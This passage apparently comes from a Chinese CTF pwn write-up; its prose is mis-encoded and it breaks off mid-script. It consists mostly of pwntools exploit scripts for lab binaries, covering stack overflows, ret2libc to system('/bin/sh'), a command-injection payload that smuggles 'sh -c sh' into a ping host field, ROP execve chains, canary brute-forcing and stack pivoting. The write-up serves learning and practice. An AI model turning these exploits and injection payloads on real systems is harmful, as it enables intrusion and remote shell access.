<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;192.168.50.1&#x27;</span>, <span class="number">58472</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">libc = ctypes.CDLL(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">libc.srand(<span class="built_in">int</span>(time.time()))</span><br><span class="line">canary = libc.rand() % <span class="number">114514</span></span><br><span class="line">backdoor = <span class="number">0x401276</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;(y/n)&#x27;</span>, <span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">124</span> + p32(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(ret)+ p64(backdoor)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Enter your message: &#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<h2 id="boom-revenge"><a href="#boom-revenge" class="headerlink" title="boom_revenge"></a>boom_revenge</h2><p><a href="#boom">åŒä¸Š</a>ï¼ˆä¸ºä»€ä¹ˆé‡å¤å‡ æ¬¡æ‰æˆåŠŸï¼Ÿï¼‰ğŸ¤”</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">p = remote(<span class="string">&#x27;192.168.50.1&#x27;</span>, <span class="number">62171</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">libc = ctypes.CDLL(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">libc.srand(<span class="built_in">int</span>(time.time()))</span><br><span class="line">canary = libc.rand() % <span class="number">114514</span></span><br><span class="line">backdoor = <span class="number">0x401276</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;(y/n)&#x27;</span>, <span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">124</span> + p32(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(ret)+ p64(backdoor)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Enter your message: &#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<h2 id="ezlibc"><a href="#ezlibc" class="headerlink" title="ezlibc"></a>ezlibc</h2><blockquote>
<p>ç›¸ä¿¡åšäº†å‰é¢é¢˜çš„ä½ ï¼Œå·²ç»åˆæ­¥å¼€å§‹äº†è§£æˆ‘ä»¬å¦‚ä½•åˆ©ç”¨æ ˆæº¢å‡ºæ¥æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹äº†ã€‚åœ¨è¿™é“é¢˜ï¼Œä½ å°†ç†è§£åŠ¨æ€é“¾æ¥ä¸å»¶è¿Ÿç»‘å®šï¼Œè¿™é‡Œå¼€å¯äº†ASLRå’ŒPIEï¼Œä½†æ˜¯ï¼Œæˆ‘ç»™äº†ä½ ä¸€ä¸ªå°ç¤¼ç‰©æ¥åº”å¯¹ä¸¤ä¸ªé˜²æŠ¤ï¼ŒåŠ¡å¿…å¦¥å–„ä¿ç®¡ï¼ è¿™ä¸ªç¤¼ç‰©æŸç§æƒ…å†µä¸‹è¿˜ä¼šå‘ç”Ÿæ”¹å˜ï¼Œæˆä¸ºå¦ä¸€ç§ç¥å…µåˆ©å™¨ï¼Œè‡³äºæ€ä¹ˆæ”¹å˜ï¼Œå°±è¦é ä½ è‡ªå·±å»æ‘¸ç´¢äº†ï¼</p>
</blockquote>
<blockquote>
<p>å»ºè®®ä½ åˆ©ç”¨gdbï¼Œå®Œæ•´çš„è·Ÿè¸ªä¸€ä¸‹æ•´ä¸ªåŠ¨æ€é“¾æ¥å’Œå»¶è¿Ÿç»‘å®šçš„è¿‡ç¨‹ï¼Œè¿™æ ·ä½ èƒ½æ›´äº†è§£å®ƒç©¶ç«Ÿæ˜¯æ€ä¹ˆå®Œæˆè¿™ä¸ªå·¥ä½œçš„ï¼ŒåŒæ—¶æœ‰åŠ©äºä½ æ›´åŠ çš„äº†è§£ret2libcè¿™ç§æ”»å‡»ã€‚</p>
</blockquote>
<p>å¼€å¯äº†PIEï¼Œæ˜¾ç„¶å¯ä»¥é€šè¿‡readæ³„éœ²PIEåŸºå€ï¼Œè¿™é‡Œæ³¨æ„ä¸€ä¸‹å»¶è¿Ÿç»‘å®šï¼Œè¿˜éœ€è¦æ³„éœ²libcï¼Œäºæ˜¯è¿”å›æ³„éœ²libcã€‚<br>å½“é‡‡ç”¨åŠ¨æ€é“¾æ¥ä»¥åŠå»¶è¿Ÿç»‘å®šä¹‹åï¼Œç¨‹åºåˆåŠ è½½çš„æ—¶å€™ï¼Œå¹¶ä¸çŸ¥é“è¯¸å¦‚readç­‰libcå‡½æ•°çš„å®é™…åŠ è½½åœ°å€ï¼Œæ­¤æ—¶éœ€è¦é€šè¿‡è¯¥æœºåˆ¶è¿›è¡Œè§£æä¹‹åï¼Œæ‰ä¼šå¡«å…¥gotè¡¨ã€‚å³å»¶è¿Ÿç»‘å®šä¸‹ got è¡¨åˆå§‹å€¼æ˜¯ <code>plt_resolve</code> åœ°å€<br>ç°åœ¨ä½ æŒæ¡ret2libcäº†ï¼Œä»¥åŠpwntoolsæŸ¥æ‰¾libcä¸­å‡½æ•°å’Œå­—ç¬¦ä¸²çš„æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;192.168.50.1&quot;</span>,<span class="number">65064</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;use &quot;</span>)</span><br><span class="line">leak_read=<span class="built_in">int</span>((p.recv(<span class="number">14</span>)),<span class="number">16</span>)</span><br><span class="line">pie_base=leak_read-<span class="number">0x1060</span></span><br><span class="line">start=pie_base+<span class="number">0x10c0</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;A&quot;</span>*<span class="number">40</span>+p64(start)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;use &quot;</span>)</span><br><span class="line">leak_read2 = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">libc_base=leak_read2-libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">pop_rdi=libc_base+<span class="number">0x2a3e5</span></span><br><span class="line">ret=pie_base+<span class="number">0x101a</span></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">40</span>+p64(pop_rdi)+p64(bin_sh)+p64(ret)+p64(system)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<h2 id="inject"><a href="#inject" class="headerlink" title="inject"></a>inject</h2><blockquote>
<p>ä¸€èˆ¬æ¥è¯´ Pwn challenges éƒ½ä»¥å†…å­˜æŸåæ¼æ´ä¸ºä¸»ã€‚ç„¶è€Œ binary ç¨‹åºæœ‰å¾ˆå¤šæ¼æ´ä¸éœ€è¦å†…å­˜è¶Šç•Œè¯»å†™ï¼Œå¼€å†å¤šçš„ä¿æŠ¤ä¹Ÿé˜²ä¸ä½ï¼Œç¨‹åºå‘˜å³ä½¿æ¢ç”¨ Rust ç­‰å†…å­˜å®‰å…¨è¯­è¨€ä¹Ÿå¯èƒ½çŠ¯ç›¸åŒçš„é”™è¯¯ã€‚è¿™ç§æ¼æ´åˆ©ç”¨èµ·æ¥ç®€å•ï¼Œå±å®³å¯èƒ½è¿˜æ›´å¤§ï¼Ÿï¼</p>
</blockquote>
<p>è¿™æ˜¯Rustå†™çš„å—<br>ä½¿ç”¨#æ³¨é‡Š<code>-c 4</code><br>æˆ–ç¬¬ä¸€ä¸ªshæ‰§è¡Œç¬¬äºŒä¸ªsh <code>ping sh -c sh -c 4</code></p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;192.168.50.1&#x27;</span>, <span class="number">52971</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#payload = &quot;\nsh -c sh&quot;</span></span><br><span class="line"><span class="comment">#payload=&quot;\nsh #&quot;</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;Enter host to ping: &#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="randomlock"><a href="#randomlock" class="headerlink" title="randomlock"></a>randomlock</h2><blockquote>
<p>è¯¸å¦‚randä¹‹ç±»çš„å‡½æ•°ï¼Œç”Ÿæˆçš„æ•°åˆ—è™½ç„¶çœ‹èµ·æ¥æ˜¯éšæœºçš„ï¼Œä½†å®é™…ä¸Šæ˜¯ç”±ä¸€ä¸ªç¡®å®šçš„ç®—æ³•äº§ç”Ÿçš„ï¼Œå› æ­¤ç§°ä¸ºâ€œä¼ªéšæœºâ€ã€‚é‚£ä¹ˆåªè¦ç§å­å›ºå®šï¼Œæˆ‘ä»¬ä¸å°±å¯ä»¥å¾—åˆ°å›ºå®šçš„æ•°åˆ—äº†å—ï¼Ÿ<br>å½“ç„¶ï¼Œæˆ‘è¿™é“é”çš„ç§å­å¯æ˜¯ç»è¿‡â€çœŸéšæœºâ€ä¸â€åŠ å¯†â€ä¸¤é“å·¥åºï¼Œè‡³å°‘çœ‹èµ·æ¥æ²¡é‚£ä¹ˆå®¹æ˜“ç ´è§£ï¼Ÿ</p>
</blockquote>
<p>çŒœæµ‹seedæ˜¯1</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">libc = ctypes.CDLL(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;192.168.50.1&#x27;</span>,<span class="number">62581</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    r = libc.rand() % <span class="number">10000</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(r).encode())</span><br><span class="line">    <span class="keyword">if</span> i &lt; <span class="number">9</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recvall())</span><br></pre></td></tr></table></figure></div>

<h2 id="syslock"><a href="#syslock" class="headerlink" title="syslock"></a>syslock</h2><blockquote>
<p>ç³»ç»Ÿè°ƒç”¨æ˜¯ä»€ä¹ˆï¼Ÿ<code>system</code>Â å‡½æ•°ä½¿ç”¨äº†ä»€ä¹ˆç³»ç»Ÿè°ƒç”¨æ¥å¯åŠ¨ä¸€ä¸ª shell å­è¿›ç¨‹ï¼Ÿå¦‚ä½•è¿›è¡Œç³»ç»Ÿè°ƒç”¨ï¼Ÿ</p>
</blockquote>
<p>å¾ˆå–„è‰¯åœ°æä¾›äº†ä¸€äº›gadgetï¼Œlose()ä¸­ä¹Ÿæœ‰syscallã€‚<br>è¿˜éœ€è¦è‡ªå·±è¯»è¿›å»<code>/bin/sh</code>,<br><em>æ³¨æ„åŠ›æ¶£æ•£</em>çš„ç¬”è€…æ³¨æ„åˆ°äº†main()çš„é€»è¾‘æ˜¯i &lt;&#x3D; 4&amp;&amp;i &#x3D;&#x3D; 59ï¼Œ</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">i = input();</span><br><span class="line"><span class="keyword">if</span> ( i &gt; <span class="number">4</span> )</span><br><span class="line">  lose();</span><br><span class="line">write(<span class="number">1</span>, <span class="string">&quot;Input your password\n&quot;</span>, <span class="number">0x14u</span>LL);</span><br><span class="line">read(<span class="number">0</span>, (<span class="type">char</span> *)&amp;s + i, <span class="number">0xCu</span>LL);</span><br><span class="line"><span class="keyword">if</span> ( i != <span class="number">59</span> )</span><br><span class="line">  lose();</span><br><span class="line">cheat();</span><br></pre></td></tr></table></figure></div>
<p><em>59æš—ç¤ºç³»ç»Ÿè°ƒç”¨å·</em>ï¼Œè¿™é‡Œä¸éœ€è¦ç›´æ¥è¦†ç›–è¿”å›åœ°å€ï¼Œè€Œæ˜¯åˆ©ç”¨æ•°ç»„ä¸‹æ ‡è¶Šç•Œä¿®æ”¹å…¨å±€å˜é‡ã€‚<br>æŸ¥çœ‹.bssæ®µ<br><code>i</code>çš„åœ°å€æ˜¯<code>0x404080</code><br><code>s</code>çš„åœ°å€æ˜¯<code>0x4040a0</code><br>å·®æ˜¯0x20ï¼Œä¹Ÿå°±æ˜¯&amp;s+-32æŒ‡å‘iï¼Œä¿®æ”¹ä½¿å…¶ä¸º59ã€‚<br>åœ¨cheat()ä¸­è¦†ç›–ï¼Œæ³¨æ„åˆ°è¿˜æ²¡æœ‰è¯»å…¥<code>/bin/sh</code><br>å› ä¸ºæ²¡æœ‰æ³¨æ„åˆ°main()ä¸­èƒ½è¯»12å­—èŠ‚ï¼Œç¬”è€…åœ¨cheat()ä¸­è¯»å…¥<code>/bin/sh</code>ã€‚ğŸ˜­ğŸ˜­ğŸ˜­<del>æ³¨æ„åŠ›æ¶£æ•£</del><br>ä¸€ä¸ªæŸ¥è¯¢ç³»ç»Ÿè°ƒç”¨å·çš„ç½‘ç«™<a class="link"   target="_blank" rel="noopener" href="https://syscall.sh/" >https:&#x2F;syscall.sh&#x2F;<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;192.168.50.1&#x27;</span>,<span class="number">54928</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_rsi_rdx = <span class="number">0x401240</span></span><br><span class="line">pop_rax = <span class="number">0x401244</span></span><br><span class="line">syscall = <span class="number">0x401230</span></span><br><span class="line">read_plt = <span class="number">0x4010A0</span></span><br><span class="line">s_addr = <span class="number">0x4040A0</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;choose mode\n&#x27;</span>,<span class="string">b&#x27;-32&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input your password&#x27;</span>)</span><br><span class="line">p.send(p64(<span class="number">59</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">64</span></span><br><span class="line">payload += <span class="string">b&#x27;SNOWCATT&#x27;</span></span><br><span class="line">payload += p64(pop_rdi_rsi_rdx)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(s_addr) + p64(<span class="number">8</span>)</span><br><span class="line">payload += p64(read_plt)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_rsi_rdx)</span><br><span class="line">payload += p64(s_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rax) + p64(<span class="number">59</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Developer Mode.\n&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<p>main()ä¸­readèƒ½è¯»12å­—èŠ‚ï¼Œä½¿ç”¨p32å‘é€59ï¼Œ8å­—èŠ‚<code>/bin/sh\x00</code>ï¼Œä¸éœ€è¦å†è°ƒç”¨<code>read</code>ï¼Œè¿™é‡Œä¸å†ç»™å‡ºexpã€‚</p>
<h2 id="ezprotection"><a href="#ezprotection" class="headerlink" title="ezprotection"></a>ezprotection</h2><blockquote>
<p>ä½ ä»¬è¿™äº› pwnerï¼Œå¤©å¤©å°±æƒ³ç€æº¢å‡ºï¼Œè¿™æ¬¡æˆ‘æ”¾äº†ä¸€åª canary åœ¨è¿™é‡Œï¼Œå®ƒä¼šä¸€ç›´ç›¯ç€ä½ ï¼Œç›´åˆ°æ°¸è¿œï¼</p>
</blockquote>
<p>å¡«æ»¡bufè¦†ç›–<code>\x00</code>æ³„éœ²canaryï¼Œå¾ªç¯æ”»å‡»çˆ†ç ´canaryï¼Œç©ºé—´ä¸å¤Ÿå°±ä½¿ç”¨p16</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">bkd = <span class="number">0x127D</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">    p = remote(<span class="string">&#x27;192.168.50.1&#x27;</span>,<span class="number">59263</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.sendafter(<span class="string">b&#x27;over you.\n&#x27;</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">25</span>)</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;A&#x27;</span>*<span class="number">25</span>)</span><br><span class="line">        canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">        log.success(<span class="string">f&quot;Leaked canary: <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">b&quot;a&quot;</span>*<span class="number">24</span> + p64(canary) + <span class="string">b&#x27;SNOWCATT&#x27;</span> + p16(bkd)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.interactive()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure></div>
<h2 id="ezpivot"><a href="#ezpivot" class="headerlink" title="ezpivot"></a>ezpivot</h2><blockquote>
<p>ä¸æ˜¯æ¯ä¸€æ¬¡æˆ‘ä»¬éƒ½èƒ½é‡åˆ°è¶³å¤Ÿé•¿çš„ç¼“å†²åŒºæº¢å‡ºã€‚è¿™ä¸€æ¬¡ï¼Œåªèƒ½æº¢å‡ºä¸€ç‚¹ç‚¹ï¼Œé‚£ä½ è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿæ ˆè¿ç§»å°±æ˜¯è§£å†³è¿™ä¸ªé—®é¢˜çš„ä¸€ä¸ªæ‰‹æ®µï¼Œé€šè¿‡æ ˆè¿ç§»æˆ‘ä»¬èƒ½è·å¾—è¶³å¤Ÿçš„æ ˆç©ºé—´ï¼Œä½†æ˜¯è¯·æ³¨æ„è¿ç§»ä¹‹åçš„æ ˆå¸ƒå±€ã€‚</p>
</blockquote>
<p>æ ˆè¿ç§»çš„ä¸€ä¸ªæ–¹æ³•æ˜¯ä¸¤æ¬¡<code>leave; retn</code><br>æŠŠæå‰å¸ƒç½®å¥½çš„ropé“¾æ”¾åˆ°åé¢å†æ‰§è¡Œçš„æ“ä½œå°±å«åšæ ˆé£æ°´</p>
<p><code>mian()</code>ä¸­è¯»å–äº†ä¸€ä¸ªæ•´æ•°<code>v4</code>ï¼Œæ³¨æ„åˆ°<code>v4&gt;32</code>åˆ™é€€å‡ºï¼Œ<code>introduce()</code>ä¸­ä¼šå‘<code>.bss</code>æ®µçš„<code>desc</code>è¯»<code>v4</code>å­—èŠ‚ã€‚è¦æŠŠ<code>.bss</code>ä¼ªé€ æˆä¸€ä¸ªæ ˆï¼Œè¶Šå¤§è¶Šå¥½ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">lea     rax, [rbp+var_10]</span><br><span class="line">mov     rsi, rax</span><br><span class="line">lea     rax, aD           ; &quot;%d&quot;</span><br><span class="line">mov     rdi, rax</span><br><span class="line">call    ___isoc99_scanf</span><br><span class="line">...</span><br><span class="line">mov     eax, [rbp+var_10]</span><br><span class="line">cmp     eax, 20h          ; 0x20 = 32</span><br><span class="line">jle     short loc_401306  ; å¦‚æœ eax &lt;= 32 åˆ™è·³è½¬</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œå‘ç°<code>read()</code>çš„å‚æ•°æ˜¯<code>nbytes</code>å¦‚æœæ˜¯ä¸€ä¸ªè´Ÿæ•°ï¼Œé‚£å®ƒä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªå·¨å¤§çš„æ­£æ•°ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, 10h</span><br><span class="line">mov     dword ptr [rbp+nbytes], edi</span><br><span class="line">mov     eax, dword ptr [rbp+nbytes]</span><br><span class="line">mov     rdx, rax        ; nbytes</span><br><span class="line">lea     rax, desc</span><br><span class="line">mov     rsi, rax        ; buf</span><br><span class="line">mov     edi, 0          ; fd</span><br><span class="line">call    _read</span><br></pre></td></tr></table></figure></div>
<p><code>main()</code>çš„æœ«å°¾ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, cs:len_of_phonenum ;è¿™é‡Œæ˜¯0x1C = 28</span><br><span class="line">movsxd  rdx, eax                ;nbytes</span><br><span class="line">lea     rax, [rbp+buf]          ;buf</span><br><span class="line">mov     rsi, rax</span><br><span class="line">call    _read</span><br></pre></td></tr></table></figure></div>
<p><code>buf</code>12å­—èŠ‚ï¼Œè¦†ç›–<code>rbp</code>8å­—èŠ‚ï¼Œå‰©ä¸‹8å­—èŠ‚æ­£å¥½è¦†ç›–è¿”å›åœ°å€ã€‚<br>ç¬”è€…å…ˆç”¨<code>introduce()</code>åœ¨<code>.bss</code>æ®µå¸ƒç½®å¥½ropé“¾ï¼Œå†å°†è¿”å›åœ°å€è¦†ç›–ä¸º<code>leave; retn</code>ã€‚<br>å½“æˆ‘ä»¬åœ¨è¿”å›åœ°å€å¤„æ”¾ä¸€ä¸ª <code>leave; ret</code>ï¼Œè€Œä¹‹å‰åˆé€šè¿‡æº¢å‡ºä¿®æ”¹äº† <code>rbp</code> æ—¶ï¼Œç¨‹åºä¼šæ‰§è¡Œç¬¬äºŒæ¬¡ <code>leave</code>ï¼Œè¿™æ—¶ <code>rsp</code> å°±ä¼šè¢«å¼ºè¡Œæ‹‰åˆ°æˆ‘ä»¬æŒ‡å®šçš„ <code>.bss</code> åœ°å€ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span 